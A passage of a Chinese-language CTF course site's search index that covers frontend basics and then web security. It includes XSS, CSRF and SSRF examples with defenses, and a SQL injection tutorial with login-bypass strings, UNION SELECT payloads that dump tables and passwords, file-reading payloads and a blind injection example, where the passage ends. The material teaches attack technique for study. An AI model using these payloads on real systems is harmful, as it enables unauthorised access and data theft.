</ul>"},{"location":"Courses/ctf/Web/#_4","title":"\u524d\u7aef\uff1a\u53ef\u89c6\u5316\u4e0e\u64cd\u4f5c\u903b\u8f91","text":"<p>\u524d\u7aef\u5f00\u53d1\u4e3b\u8981\u5173\u6ce8\u7528\u6237\u754c\u9762\u7684\u8bbe\u8ba1\u548c\u7528\u6237\u4ea4\u4e92\u3002</p>"},{"location":"Courses/ctf/Web/#htmlcssjavascript","title":"HTML/CSS/JavaScript","text":"<p>\u4f60\u77e5\u9053\u6211\u8981\u8bf4\u4ec0\u4e48\uff0c\u81ea\u5b66\u53bb\u5427</p>"},{"location":"Courses/ctf/Web/#typescript","title":"TypeScript","text":"<p>TypeScript\uff08\u7b80\u79f0TS\uff09\u662f\u7531\u5fae\u8f6f\u5f00\u53d1\u7684\u4e00\u79cd\u5f00\u6e90\u7f16\u7a0b\u8bed\u8a00\uff0c\u662fJavaScript\u7684\u8d85\u96c6\uff0c\u589e\u52a0\u4e86\u9759\u6001\u7c7b\u578b\u548c\u7c7b\u7b49\u7279\u6027\u3002</p> <ul> <li>\u9759\u6001\u7c7b\u578b\uff1a\u901a\u8fc7\u7c7b\u578b\u68c0\u67e5\u51cf\u5c11\u8fd0\u884c\u65f6\u9519\u8bef\uff0c\u63d0\u9ad8\u4ee3\u7801\u7684\u53ef\u7ef4\u62a4\u6027(JavaScript\u662f\u5f31\u7c7b\u578b\u7684\u8bed\u8a00)\u3002</li> </ul> <pre><code>let message: string = \"Hello, TypeScript!\";\n</code></pre> <ul> <li>\u7c7b\u548c\u63a5\u53e3\uff1a\u652f\u6301\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\uff0c\u589e\u5f3a\u4ee3\u7801\u7ed3\u6784\u6027\u3002</li> </ul> <pre><code>class Greeter {\n    greeting: string;\n    constructor(message: string) {\n        this.greeting = message;\n    }\n    greet() {\n        return \"Hello, \" + this.greeting;\n    }\n}\n\nlet greeter = new Greeter(\"world\");\nconsole.log(greeter.greet());\n</code></pre> <ul> <li>\u6a21\u5757\u5316\uff1a\u652f\u6301\u6a21\u5757\u5316\u7f16\u7a0b\uff0c\u63d0\u9ad8\u4ee3\u7801\u590d\u7528\u6027\u548c\u7ec4\u7ec7\u6027\u3002</li> </ul> <pre><code>import { add } from './math';\nconsole.log(add(2, 3));\n</code></pre>"},{"location":"Courses/ctf/Web/#nodejs","title":"Node.js","text":"<p>Node.js\u662f\u7531Ryan Dahl\u57282009\u5e74\u5f00\u53d1\u7684\u4e00\u4e2a\u5f00\u6e90\u3001\u8de8\u5e73\u53f0\u7684JavaScript\u8fd0\u884c\u65f6\u73af\u5883\uff0c\u57fa\u4e8eChrome\u7684V8\u5f15\u64ce\u6784\u5efa\u3002Node.js\u7684\u51fa\u73b0\u4f7f\u5f97JavaScript\u53ef\u4ee5\u7528\u4e8e\u670d\u52a1\u5668\u7aef\u5f00\u53d1\u3002</p> <ul> <li>\u8d77\u6e90\uff1aNode.js\u8bde\u751f\u4e8e\u5bf9\u9ad8\u6027\u80fd\u3001\u975e\u963b\u585eI/O\u6a21\u578b\u7684\u9700\u6c42\u3002</li> <li>\u53d1\u5c55\uff1aNode.js\u8fc5\u901f\u53d1\u5c55\uff0c\u6210\u4e3a\u6784\u5efa\u9ad8\u6027\u80fd\u3001\u53ef\u6269\u5c55\u7f51\u7edc\u5e94\u7528\u7684\u9996\u9009\u5e73\u53f0\u3002</li> </ul>"},{"location":"Courses/ctf/Web/#_5","title":"\u524d\u7aef\u76f8\u5173\u5b89\u5168\u8bdd\u9898","text":""},{"location":"Courses/ctf/Web/#xss","title":"XSS\uff08\u8de8\u7ad9\u653b\u51fb\u811a\u672c\uff09","text":"<p>\u5047\u8bbe\u6709\u4e00\u4e2a\u7559\u8a00\u677f\u5e94\u7528\uff0c\u7528\u6237\u53ef\u4ee5\u63d0\u4ea4\u7559\u8a00\u3002\u5982\u679c\u5e94\u7528\u6ca1\u6709\u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u8fc7\u6ee4\u548c\u7f16\u7801\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u63d0\u4ea4\u4ee5\u4e0b\u6076\u610f\u7559\u8a00\uff1a </p><pre><code>&lt;script&gt;alert('XSS \u653b\u51fb\uff01');&lt;/script&gt;\n</code></pre> <p>\u5f53\u5176\u4ed6\u7528\u6237\u8bbf\u95ee\u7559\u8a00\u677f\u65f6\uff0c\u8fd9\u6bb5\u811a\u672c\u4f1a\u5728\u4ed6\u4eec\u7684\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\uff0c\u5f39\u51fa\u4e00\u4e2a\u8b66\u544a\u6846\u3002</p> <p>\u9632\u62a4\u63aa\u65bd\uff1a</p> <ul> <li>\u8f93\u5165\u9a8c\u8bc1\uff1a\u5728\u670d\u52a1\u5668\u7aef\u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u4e25\u683c\u7684\u9a8c\u8bc1\u548c\u8fc7\u6ee4\uff0c\u62d2\u7edd\u4efb\u4f55\u53ef\u7591\u7684\u8f93\u5165\u3002</li> <li>\u8f93\u51fa\u7f16\u7801\uff1a\u5728\u5c06\u7528\u6237\u8f93\u5165\u663e\u793a\u5728\u9875\u9762\u4e0a\u65f6\uff0c\u8fdb\u884c\u9002\u5f53\u7684\u7f16\u7801\uff0c\u9632\u6b62\u6076\u610f\u4ee3\u7801\u88ab\u6267\u884c\u3002</li> <li>Content Security Policy (CSP)\uff1a\u5728HTTP\u5934\u4e2d\u8bbe\u7f6eCSP\u7b56\u7565\uff0c\u9650\u5236\u9875\u9762\u53ef\u4ee5\u52a0\u8f7d\u7684\u8d44\u6e90\u3002</li> </ul>"},{"location":"Courses/ctf/Web/#csrf-ssrf","title":"CSRF\uff08\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff09\u4e0e SSRF\uff08\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\uff09","text":"<p>CSRF \u793a\u4f8b\uff1a \u5047\u8bbe\u6709\u4e00\u4e2a\u8f6c\u8d26\u529f\u80fd\uff0c\u7528\u6237\u53ef\u4ee5\u901a\u8fc7POST\u8bf7\u6c42\u5411\u6307\u5b9a\u8d26\u6237\u8f6c\u8d26\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u6076\u610f\u9875\u9762\uff0c\u8bf1\u5bfc\u7528\u6237\u70b9\u51fb\uff1a</p> <pre><code>&lt;form action=\"&lt;https://bank.com/transfer&gt;\" method=\"POST\"&gt;\n    &lt;input type=\"hidden\" name=\"to\" value=\"attacker\"&gt; \n    &lt;input type=\"hidden\" name=\"amount\" value=\"1000\"&gt;\n&lt;/form&gt; \n&lt;script&gt;document.forms[0].submit();&lt;/script&gt;\n</code></pre> <p>\u7528\u6237\u5728\u5df2\u767b\u5f55\u94f6\u884c\u7f51\u7ad9\u7684\u60c5\u51b5\u4e0b\u8bbf\u95ee\u8be5\u9875\u9762\uff0c\u4f1a\u81ea\u52a8\u53d1\u8d77\u8f6c\u8d26\u8bf7\u6c42\u3002</p> <p></p> <p>\u9632\u62a4\u63aa\u65bd\uff1a</p> <ul> <li>CSRF Token\uff1a\u5728\u8868\u5355\u4e2d\u52a0\u5165\u968f\u673a\u7684CSRF Token\uff0c\u786e\u4fdd\u8bf7\u6c42\u662f\u6765\u81ea\u5408\u6cd5\u7684\u6765\u6e90\u3002</li> <li>SameSite Cookie\uff1a\u8bbe\u7f6eCookie\u7684SameSite\u5c5e\u6027\uff0c\u9632\u6b62\u8de8\u7ad9\u8bf7\u6c42\u65f6Cookie\u88ab\u53d1\u9001\u3002</li> </ul> <p>SSRF \u793a\u4f8b\uff1a \u5047\u8bbe\u6709\u4e00\u4e2aWeb\u5e94\u7528\u5141\u8bb8\u7528\u6237\u8f93\u5165URL\u5e76\u83b7\u53d6\u8be5URL\u7684\u5185\u5bb9\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u8f93\u5165\u5185\u90e8\u670d\u52a1\u7684URL\uff0c\u83b7\u53d6\u654f\u611f\u4fe1\u606f\uff1a</p> <pre><code>&lt;https://example.com/fetch?url=http://internal-service:8080/secret&gt;\n</code></pre> \u5e38\u7528\u5185\u7f51ip\u6bb5 <ul> <li>192.168.0.0/16 =&gt; 192.168.0.0 ~ 192.168.255.255</li> <li>10.0.0.0/8 =&gt; 10.0.0.0 ~ 10.255.255.255</li> <li>172.16.0.0/12 =&gt; 172.16.0.0 ~ 172.31.255.255<ul> <li>\u5b9e\u9645\u4e0a\uff0c\u5224\u65ad\u662f\u5426\u662f\u5185\u7f51ip\u8fd8\u5305\u62ec 127.0.0.0/8 \u548c 0.0.0.0/8</li> </ul> </li> </ul> <p>\u9632\u62a4\u63aa\u65bd\uff1a</p> <ul> <li>\u767d\u540d\u5355\u673a\u5236\uff1a\u9650\u5236\u670d\u52a1\u5668\u53ea\u80fd\u8bbf\u95ee\u7279\u5b9a\u7684\u5185\u90e8\u8d44\u6e90\u6216\u5916\u90e8\u8d44\u6e90\uff0c\u4f7f\u7528\u767d\u540d\u5355\u673a\u5236\u8fdb\u884c\u9632\u62a4\u3002</li> </ul> <pre><code>ALLOWED_DOMAINS = ['example.com', 'trusted.com']\n\ndef fetch_url(url):\n    parsed_url = urlparse(url)\n    if parsed_url.netloc not in ALLOWED_DOMAINS:\n        return \"Access Denied\"\n    # \u7ee7\u7eed\u5904\u7406\u8bf7\u6c42\n</code></pre> <p>\u53c2\u8003\u9605\u8bfb</p> <p>\u6240\u4ee5\uff0c\u5f52\u7eb3\u4e00\u4e0b\uff0c\u5b8c\u7f8e\u89e3\u51b3SSRF\u6f0f\u6d1e\u7684\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <ol> <li>\u89e3\u6790\u76ee\u6807URL\uff0c\u83b7\u53d6\u5176Host</li> <li>\u89e3\u6790Host\uff0c\u83b7\u53d6Host\u6307\u5411\u7684IP\u5730\u5740</li> <li>\u68c0\u67e5IP\u5730\u5740\u662f\u5426\u4e3a\u5185\u7f51IP</li> <li>\u8bf7\u6c42URL</li> <li>\u5982\u679c\u6709\u8df3\u8f6c\uff0c\u62ff\u51fa\u8df3\u8f6cURL\uff0c\u6267\u884c1</li> </ol>"},{"location":"Courses/ctf/Web/#_6","title":"\u8de8\u57df","text":"<p>\u793a\u4f8b\uff1a \u5047\u8bbe\u6709\u4e00\u4e2aWeb\u5e94\u7528\u9700\u8981\u4ece\u53e6\u4e00\u4e2a\u57df\u540d\u52a0\u8f7d\u6570\u636e\uff0c\u4f46\u7531\u4e8e\u540c\u6e90\u7b56\u7565\uff0c\u76f4\u63a5\u8bf7\u6c42\u4f1a\u88ab\u963b\u6b62</p> <p>\u9632\u62a4\u63aa\u65bd\uff1a</p> <ul> <li>CORS\uff08\u8de8\u57df\u8d44\u6e90\u5171\u4eab\uff09\uff1a\u5728\u670d\u52a1\u5668\u7aef\u8bbe\u7f6eCORS\u5934\uff0c\u5141\u8bb8\u7279\u5b9a\u7684\u57df\u540d\u8bbf\u95ee\u8d44\u6e90\u3002</li> <li>\u4ee3\u7406\u670d\u52a1\u5668\uff1a\u5728\u670d\u52a1\u5668\u7aef\u8bbe\u7f6e\u4ee3\u7406\uff0c\u5c06\u8de8\u57df\u8bf7\u6c42\u8f6c\u53d1\u5230\u76ee\u6807\u670d\u52a1\u5668\uff0c\u907f\u514d\u76f4\u63a5\u5728\u5ba2\u6237\u7aef\u8fdb\u884c\u8de8\u57df\u8bf7\u6c42\u3002</li> </ul>"},{"location":"Courses/ctf/Web/#_7","title":"\u5c3e\u58f0","text":"<p>\u7ecf\u5178\u8001\u756a\uff1a\u5730\u5740\u680f\u8f93\u5165\u7f51\u5740\u5e76\u8bbf\u95ee\u540e\u53d1\u751f\u4e86\u4ec0\u4e48</p> <ol> <li>DNS\u89e3\u6790\uff08\u57df\u540d\u89e3\u6790\uff09\uff1a<ul> <li>\u6d4f\u89c8\u5668\u4f1a\u9996\u5148\u68c0\u67e5\u672c\u5730\u7f13\u5b58\u4e2d\u662f\u5426\u6709\u8be5\u7f51\u5740\u5bf9\u5e94\u7684IP\u5730\u5740\u3002</li> <li>\u5982\u679c\u6ca1\u6709\uff0c\u5b83\u4f1a\u5411DNS\u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\uff0c\u67e5\u8be2\u8be5\u7f51\u5740\u7684IP\u5730\u5740\u3002</li> <li>DNS\u670d\u52a1\u5668\u8fd4\u56de\u8be5\u7f51\u5740\u5bf9\u5e94\u7684IP\u5730\u5740\u7ed9\u6d4f\u89c8\u5668\u3002</li> </ul> </li> <li>\u5efa\u7acbTCP\u8fde\u63a5\uff1a<ul> <li>\u6d4f\u89c8\u5668\u4f7f\u7528\u524d\u9762\u5f97\u5230\u7684IP\u5730\u5740\uff0c\u901a\u8fc7TCP/IP\u534f\u8bae\u4e0e\u76ee\u6807\u670d\u52a1\u5668\u5efa\u7acb\u8fde\u63a5\u3002</li> <li>\u8fd9\u5305\u62ec\u4e09\u6b21\u63e1\u624b\u8fc7\u7a0b\uff1a\u5ba2\u6237\u7aef\u53d1\u9001SYN\u5305\uff0c\u670d\u52a1\u5668\u8fd4\u56deSYN-ACK\u5305\uff0c\u5ba2\u6237\u7aef\u518d\u53d1\u9001ACK\u5305\u786e\u8ba4\u8fde\u63a5\u3002</li> </ul> </li> <li>\u53d1\u9001HTTP\u8bf7\u6c42\uff1a<ul> <li>\u5efa\u7acb\u8fde\u63a5\u540e\uff0c\u6d4f\u89c8\u5668\u4f1a\u53d1\u9001\u4e00\u4e2aHTTP\u8bf7\u6c42\u5230\u670d\u52a1\u5668\u3002\u8fd9\u4e2a\u8bf7\u6c42\u5305\u542b\u4e86\u8bf7\u6c42\u65b9\u6cd5\uff08\u5982GET\u6216POST\uff09\u3001\u8bf7\u6c42\u7684\u8d44\u6e90\u8def\u5f84\u4ee5\u53ca\u4e00\u4e9b\u5934\u4fe1\u606f\uff08\u5982\u6d4f\u89c8\u5668\u7c7b\u578b\u3001\u53ef\u63a5\u53d7\u7684\u6587\u4ef6\u7c7b\u578b\u7b49\uff09\u3002</li> </ul> </li> <li>\u670d\u52a1\u5668\u5904\u7406\u8bf7\u6c42\u5e76\u8fd4\u56de\u54cd\u5e94\uff1a<ul> <li>\u670d\u52a1\u5668\u63a5\u6536\u5230\u8bf7\u6c42\u540e\uff0c\u4f1a\u5904\u7406\u8be5\u8bf7\u6c42\uff0c\u67e5\u627e\u8bf7\u6c42\u7684\u8d44\u6e90\uff08\u5982HTML\u6587\u4ef6\u3001\u56fe\u7247\u3001\u89c6\u9891\u7b49\uff09\u3002</li> <li>\u670d\u52a1\u5668\u4f1a\u5c06\u627e\u5230\u7684\u8d44\u6e90\u4ee5\u53ca\u4e00\u4e9b\u5934\u4fe1\u606f\uff08\u5982\u5185\u5bb9\u7c7b\u578b\u3001\u5185\u5bb9\u957f\u5ea6\u7b49\uff09\u6253\u5305\u6210HTTP\u54cd\u5e94\uff0c\u8fd4\u56de\u7ed9\u6d4f\u89c8\u5668\u3002</li> </ul> </li> <li>\u6d4f\u89c8\u5668\u63a5\u6536\u54cd\u5e94\u5e76\u6e32\u67d3\u9875\u9762\uff1a<ul> <li>\u6d4f\u89c8\u5668\u63a5\u6536\u5230\u670d\u52a1\u5668\u8fd4\u56de\u7684HTTP\u54cd\u5e94\u540e\uff0c\u4f1a\u89e3\u6790\u54cd\u5e94\u7684\u5934\u4fe1\u606f\u548c\u5185\u5bb9\u3002</li> <li>\u5982\u679c\u5185\u5bb9\u662fHTML\u6587\u4ef6\uff0c\u6d4f\u89c8\u5668\u4f1a\u89e3\u6790HTML\u5e76\u6839\u636e\u5176\u4e2d\u7684\u6307\u4ee4\uff08\u5982\u52a0\u8f7dCSS\u6587\u4ef6\u3001\u6267\u884cJavaScript\u811a\u672c\u7b49\uff09\u8fdb\u884c\u6e32\u67d3\u3002</li> <li>\u6d4f\u89c8\u5668\u4f1a\u9010\u6b65\u6784\u5efaDOM\u6811\u548cCSSOM\u6811\uff0c\u5e76\u6839\u636e\u5b83\u4eec\u751f\u6210\u6e32\u67d3\u6811\uff0c\u6700\u540e\u5c06\u5185\u5bb9\u7ed8\u5236\u5230\u5c4f\u5e55\u4e0a\u3002</li> </ul> </li> <li>\u52a0\u8f7d\u8d44\u6e90\uff1a<ul> <li>\u5982\u679cHTML\u6587\u4ef6\u4e2d\u5305\u542b\u4e86\u5176\u4ed6\u8d44\u6e90\uff08\u5982\u56fe\u7247\u3001CSS\u3001JavaScript\u7b49\uff09\uff0c\u6d4f\u89c8\u5668\u4f1a\u6839\u636e\u9700\u8981\u53d1\u9001\u989d\u5916\u7684HTTP\u8bf7\u6c42\u6765\u52a0\u8f7d\u8fd9\u4e9b\u8d44\u6e90\u3002</li> <li>\u8fd9\u4e9b\u8d44\u6e90\u52a0\u8f7d\u5b8c\u6210\u540e\uff0c\u6d4f\u89c8\u5668\u4f1a\u7ee7\u7eed\u6e32\u67d3\u9875\u9762\uff0c\u66f4\u65b0\u663e\u793a\u5185\u5bb9\u3002</li> </ul> </li> </ol> <p>\u6574\u4e2a\u8fc7\u7a0b\u901a\u5e38\u5728\u77ed\u65f6\u95f4\u5185\u5b8c\u6210\uff0c\u4ee5\u786e\u4fdd\u7528\u6237\u80fd\u591f\u5feb\u901f\u770b\u5230\u7f51\u9875\u5185\u5bb9\u3002</p>"},{"location":"Courses/ctf/WebTopic/","title":"Web \u4e13\u9898","text":""},{"location":"Courses/ctf/WebTopic/#web","title":"Web \u4e13\u9898","text":"<p> \u7ea6 1515 \u4e2a\u5b57  30 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p>"},{"location":"Courses/ctf/WebTopic/#web-sql","title":"Web \u4e13\u9898\u4e00 SQL\u6ce8\u5165","text":""},{"location":"Courses/ctf/WebTopic/#sql","title":"SQL\u6ce8\u5165\u57fa\u7840","text":"<p>\u5e38\u89c1 SQL \u67e5\u8be2\u8bed\u53e5\uff1a </p> <ul> <li><code>$sql=select xxx from xxx where ...</code><ul> <li><code>user='$username' and password='$password'</code></li> <li><code>id=$id</code></li> </ul> </li> </ul> <p>\u5728\u8fdb\u884c SQL \u6ce8\u5165\u4e4b\u524d\uff0c\u9996\u5148\u9700\u8981\u641e\u6e05\u695a SQL \u67e5\u8be2\u8bed\u53e5\u7684\u95ed\u5408\u65b9\u5f0f\uff0c\u5373\u662f\u5355\u5f15\u53f7\u95ed\u5408\u3001\u53cc\u5f15\u53f7\u95ed\u5408\u8fd8\u662f\u6570\u5b57\u7c7b\u578b</p> <p>\u5177\u4f53\u800c\u8a00\uff1a</p> <ul> <li>\u5982\u679c\u8f93\u5165 <code>'</code> \u6ca1\u6709\u62a5\u9519(\u62a5\u9519\u663e\u793a\u4ec0\u4e48\u5f97\u770b\u6e90\u4ee3\u7801\u7684\u7ed3\u6784)\uff0c\u90a3\u4e48\u67e5\u8be2\u8bed\u53e5\u4e00\u822c\u662f\u53cc\u5f15\u53f7\u95ed\u5408<ul> <li>\u6784\u6210 <code>select xxx from xxx where user=\"'\"</code></li> </ul> </li> <li>\u5982\u679c\u8f93\u5165 <code>\"</code> \u6ca1\u6709\u62a5\u9519\uff0c\u90a3\u4e48\u67e5\u8be2\u8bed\u53e5\u4e00\u822c\u662f\u5355\u5f15\u53f7\u95ed\u5408<ul> <li>\u6784\u6210 <code>select xxx from xxx where user='\"'</code></li> </ul> </li> <li>\u5982\u679c\u4e0a\u8ff0\u4e24\u4e2a\u65b9\u5f0f\u90fd\u62a5\u9519\u4e86\uff0c\u90a3\u4e48\u5f88\u53ef\u80fd\u662f\u6570\u5b57\u7c7b\u578b<ul> <li>\u6784\u6210 <code>select xxx from xxx where id='</code></li> </ul> </li> </ul> <p>\u4e0a\u8ff0\u53ea\u662f\u4e00\u822c\u8bba\uff0c\u5b9e\u6218\u4e2d\u8bf7\u505a\u597d\u81ea\u5df1\u7684\u5224\u65ad</p> <p>\u77e5\u9053\u95ed\u5408\u7c7b\u578b\u540e\uff0c\u5c31\u53ef\u4ee5\u5f00\u59cb\u5c1d\u8bd5\u6784\u5efa\u4e00\u4e2a\u80fd\u591f\u8fd4\u56de\u6570\u636e\u7684 payload \u4e86</p> <p>\u7531\u4e8e\u6570\u5b57\u7c7b\u578b\u7684 SQL \u67e5\u8be2\u975e\u5e38\u5c11\u89c1\uff0c\u6211\u4eec\u6f14\u793a\u7684\u5747\u4e3a \u5355\u5f15\u53f7\u95ed\u5408\u7c7b\u578b \uff0c\u6bd4\u5982\u4e00\u4e2a\u975e\u5e38\u5e38\u89c1\u7684\u6ce8\u5165\u65b9\u5f0f\uff1a <code>' or ''='</code></p> <p>\u6b64\u65f6\uff0c\u66ff\u6362\u5f97\u5230\u7684\u67e5\u8be2\u8bed\u53e5\u4e3a <code>select xxx from xxx where user='' or ''=''</code> \uff0c\u6761\u4ef6\u6052\u4e3a True </p> <p>\u5e38\u89c1\u7684\u4e07\u80fd\u5bc6\u7801\u5982\u4e0b\uff0c\u4e0d\u8fc7\u4e00\u822c\u4e5f\u6ca1\u4ec0\u4e48\u5927\u7528\u5904</p> <ul> <li><code>admin' --</code></li> <li><code>admin' #</code></li> <li><code>admin'/*</code></li> <li><code>' or 1=1--</code></li> <li><code>' or 1=1#</code></li> <li><code>' or 1=1/*</code></li> <li><code>') or '1'='1--</code></li> <li><code>') or ('1'='1--</code></li> </ul> <p><code>--</code> \u540e\u9762\u9700\u8981\u52a0\u4e00\u4e2a\u7a7a\u683c\u624d\u80fd\u8d77\u5230\u6ce8\u91ca\u4f5c\u7528</p>"},{"location":"Courses/ctf/WebTopic/#_1","title":"\u57fa\u672c\u6ce8\u5165\u65b9\u5f0f","text":"<p>SQL \u7684\u6ce8\u5165\u5206\u4e3a \u6709\u56de\u663e \u548c \u65e0\u56de\u663e \uff0c\u5176\u4e8c\u8005\u6240\u9700\u8981\u7684\u6ce8\u5165\u65b9\u5f0f\u5927\u4e0d\u76f8\u540c</p>"},{"location":"Courses/ctf/WebTopic/#_2","title":"\u6709\u56de\u663e\u6ce8\u5165","text":"<p>\u6709\u56de\u663e\uff0c\u987e\u540d\u601d\u4e49\u5c31\u662f\u4f1a\u8fd4\u56de\u4f60\u67e5\u8be2\u5230\u7684\u6570\u636e\u3002\u5bf9\u4e8e\u6b64\u79cd\u6ce8\u5165\uff0c\u6700\u5e38\u89c1\u7684\u65b9\u6cd5\u5c31\u662f\u4f7f\u7528 <code>UNION SELECT</code> \u8054\u5408\u67e5\u8be2\u81ea\u5df1\u60f3\u8981\u5f97\u5230\u7684\u6570\u636e</p> <p>\u7531\u4e8e\u6211\u4eec\u4e00\u822c\u4e0d\u6e05\u695a\u67e5\u8be2\u7684\u8868\u5355\u4f1a\u8fd4\u56de\u591a\u5c11\u5b57\u6bb5\u6570\u636e\uff0c\u6240\u4ee5\u5728 <code>UNION SELECT</code> \u4e4b\u524d\uff0c\u4e00\u822c\u8981\u7528 <code>ORDER BY</code> \u6765\u6d4b\u8bd5\uff0c<code>ORDER BY n</code> \u5f53\u4f60\u67e5\u8be2\u5230\u7684\u5b57\u6bb5\u6570\u5927\u4e8e n \uff0c\u4e0d\u4f1a\u62a5\u9519\uff1b\u53cd\u4e4b\uff0c\u5219\u4f1a\u62a5\u9519\uff0c\u85c9\u6b64\u786e\u5b9a\u6211\u4eec <code>UNION SELECT</code> \u540e\u8981\u63a5\u591a\u5c11\u6761\u6570\u636e</p> <p>\u4e0d\u7528 ORDER BY \u4e5f\u53ef\u4ee5</p> <p>\u4e8b\u5b9e\u4e0a\uff0c\u4f60\u4e5f\u53ef\u4ee5\u76f4\u63a5\u9009\u62e9 <code>UNION SELECT 1,2,3,...</code> \uff0c\u4e00\u76f4\u8bd5\u5230\u62a5\u9519\u5373\u53ef</p> <p>\u786e\u5b9a\u5b57\u6bb5\u6570\u540e\uff0c\u5c31\u53ef\u4ee5\u4e3a\u6240\u6b32\u4e3a\u7684\u7206\u51fa\u6570\u636e\u5e93\u7684\u4fe1\u606f\u4e86\uff0c\u4e0b\u9762\u5747\u4ee5\u5b57\u6bb5\u6570\u4e3a 1 \u7684\u6709\u56de\u663e\u6ce8\u5165\u4e3a\u4f8b\u5b50\uff1a</p> <p>\u5047\u8bbe\u6709\u67e5\u8be2\u8bed\u53e5\uff1a  <code>$SQL=select xxx from xxx where user=''</code></p> <ul> <li><code>admin' union select DATABASE()#</code> <ul> <li>\u7206\u51fa\u6570\u636e\u5e93\u540d</li> </ul> </li> <li><code>admin' union select group_concat(table_name) from information_schema.tables where table_schema=DATABASE()#</code><ul> <li>MySQL \u4e2d\u6709 <code>infomation_schema</code> \uff0c\u5b58\u50a8\u7740\u8be5\u6570\u636e\u5e93\u91cc\u9762\u8868\u5355\u7684\u5404\u79cd\u6570\u636e</li> <li>\u7206\u51fa\u8be5\u6570\u636e\u5e93\u5185\u7684\u6240\u6709\u8868\u540d</li> </ul> </li> <li><code>admin' union select GROUP_CONCAT(PASSWORD) FROM USERS)#</code><ul> <li>\u5047\u8bbe\u8be5\u6570\u636e\u5e93\u5185\u6709\u8868\u5355\u540d\u4e3a <code>USERS</code> \uff0c\u4e14\u6709\u5217\u540d\u4e3a <code>PASSWORD</code></li> <li>\u5176\u5b9e\u5217\u540d\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7c7b\u4f3c\u65b9\u5f0f\u5728 <code>infomation_schema</code> \u4e2d\u7206\u51fa\uff0c\u8bf7\u81ea\u884c\u63a2\u7d22</li> <li>\u7206\u51fa\u8868\u4e2d\u7684\u6240\u6709 <code>PASSWORD</code></li> </ul> </li> <li><code>admin' union select load_file('/home/flag.txt')#</code><ul> <li>\u8bfb\u53d6\u670d\u52a1\u5668\u4e0a\u6587\u4ef6\u6570\u636e</li> <li>\u5728\u5bf9\u65b9\u670d\u52a1\u5668\u5141\u8bb8\u7684\u60c5\u51b5\u4e0b\uff0c\u4ec0\u4e48\u53ef\u4ee5\u4f7f\u7528 <code>into file</code> \u6765\u5199\u5165\u6587\u4ef6(\u4e00\u822c\u4e0d\u5141\u8bb8\u5c31\u662f\u4e86)</li> </ul> </li> </ul> <p>\u6ce8\u5165\u5e38\u89c1\u53c2\u6570\u5982\u4e0b\uff1a</p> <ul> <li><code>user()</code>\uff1a\u5f53\u524d\u6570\u636e\u5e93\u7528\u6237</li> <li><code>database()</code>\uff1a\u5f53\u524d\u6570\u636e\u5e93\u540d</li> <li><code>version()</code>\uff1a\u5f53\u524d\u4f7f\u7528\u7684\u6570\u636e\u5e93\u7248\u672c</li> <li><code>@@datadir</code>\uff1a\u6570\u636e\u5e93\u5b58\u50a8\u6570\u636e\u8def\u5f84</li> <li><code>concat()</code>\uff1a\u8054\u5408\u6570\u636e\uff0c\u7528\u4e8e\u8054\u5408\u4e24\u6761\u6570\u636e\u7ed3\u679c\u3002\u5982\u00a0<code>concat(username,0x3a,password)</code></li> <li><code>group_concat()</code>\uff1a\u548c\u00a0<code>concat()</code>\u00a0\u7c7b\u4f3c\uff0c\u5982\u00a0<code>group_concat(DISTINCT+user,0x3a,password)</code>\uff0c\u7528\u4e8e\u628a\u591a\u6761\u6570\u636e\u4e00\u6b21\u6ce8\u5165\u51fa\u6765</li> <li><code>concat_ws()</code>\uff1a\u7528\u6cd5\u7c7b\u4f3c</li> <li><code>hex()</code>\u00a0\u548c\u00a0<code>unhex()</code>\uff1a\u7528\u4e8e hex \u7f16\u7801\u89e3\u7801</li> <li><code>load_file()</code>\uff1a\u4ee5\u6587\u672c\u65b9\u5f0f\u8bfb\u53d6\u6587\u4ef6\uff0c\u5728 Windows \u4e2d\uff0c\u8def\u5f84\u8bbe\u7f6e\u4e3a\u00a0<code>\\\\</code></li> <li><code>select xxoo into outfile '\u8def\u5f84'</code>\uff1a\u6743\u9650\u8f83\u9ad8\u65f6\u53ef\u76f4\u63a5\u5199\u6587\u4ef6</li> </ul>"},{"location":"Courses/ctf/WebTopic/#_3","title":"\u65e0\u56de\u663e\u6ce8\u5165","text":"<p>\u65e0\u56de\u663e\u6ce8\u5165\u662f\u770b\u4e0d\u5230\u4f60\u67e5\u8be2\u5230\u7684\u6570\u636e\u662f\u5982\u4f55\u7684\uff0c\u6709\u4e9b\u9898\u76ee\u7684\u62a5\u9519\u754c\u9762\u751a\u81f3\u5c31\u662f\u4e00\u4e2a\u7a7a\u767d\uff0c\u4f46\u662f\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u5229\u7528 <code>SUBSTR</code> \u51fd\u6570\u6765\u5bf9\u5176\u8fdb\u884c\u5224\u65ad</p> <p>\u5047\u8bbe\u6709\u4e00\u4e2a\u767b\u5f55\u754c\u9762\uff0c\u53ea\u6709\u4f60\u767b\u5f55\u6210\u529f\u7684\u65f6\u5019\u4f1a\u6709\u6d88\u606f\u63d0\u793a\uff0c\u4e14\u67e5\u8be2\u8bed\u53e5\u4e3a <code>select xxx from xxx where user='$username' and password='$password'</code> \u90a3\u4e48\uff1a</p> <ul> <li><code>password=111&amp;username=0' or ascii(substr(DATABASE(),1,1))&gt;96#</code><ul> <li>\u5224\u65ad DATABASE() \u7684\u7b2c\u4e00\u4f4d\u5b57\u7b26\u7684ASCII\u7801\u662f\u5426\u5927\u4e8e96\uff0c\u662f\u7684\u8bdd\u8fd4\u56de\u767b\u5f55\u6210\u529f</li> <li>\u540e\u9762\u5173\u4e8e password \u7684\u5224\u5b9a\u76f4\u63a5\u88ab\u6ce8\u91ca\u6389\u4e86\uff0c\u6240\u4ee5\u65e0\u5173\u5927\u96c5</li> </ul> </li> 